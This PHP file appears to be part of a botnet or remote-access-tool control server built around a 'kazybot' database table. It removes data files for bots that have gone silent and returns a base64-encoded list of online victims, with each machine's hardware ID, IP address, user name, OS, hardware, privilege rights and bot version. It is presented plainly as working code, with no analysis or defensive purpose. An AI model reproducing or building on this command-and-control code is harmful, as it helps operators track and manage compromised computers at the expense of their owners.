<?php
require_once("settings.php");

$query = "SELECT HWID FROM kazybot WHERE LAST < DATE_ADD(NOW(), INTERVAL -" . strval($dctimeout) . " SECOND)";
$result = mysqli_query($sql, $query);
while($row = mysqli_fetch_array($result))
{
	if(file_exists("data/" . $row['HWID'] . ".dat"))
		unlink("data/" . $row['HWID'] . ".dat");
	if(file_exists("data/" . $row['HWID'] . "S.dat"))
		unlink("data/" . $row['HWID'] . "S.dat");
	//mysqli_query($sql, "DELETE FROM kazybot WHERE HWID = '" . $row['HWID'] . "'");
}

$query = "SELECT * FROM kazybot WHERE LAST >= DATE_ADD(NOW(), INTERVAL -" . strval($dctimeout) . " SECOND)";
$result = mysqli_query($sql, $query);
$res = "";

while($row = mysqli_fetch_array($result))
	$res .= $row['HWID'] . "|" . $row['IP'] . "|" . $row['ID'] . "|" . $row['USER'] . "|" . $row['OS'] . "|" . $row['PROCESSOR'] . "|" . $row['MEMORY'] . "|" . $row['RIGHTS'] . "|" . $row['VERSION'] . "|";
echo base64_encode($res);
?>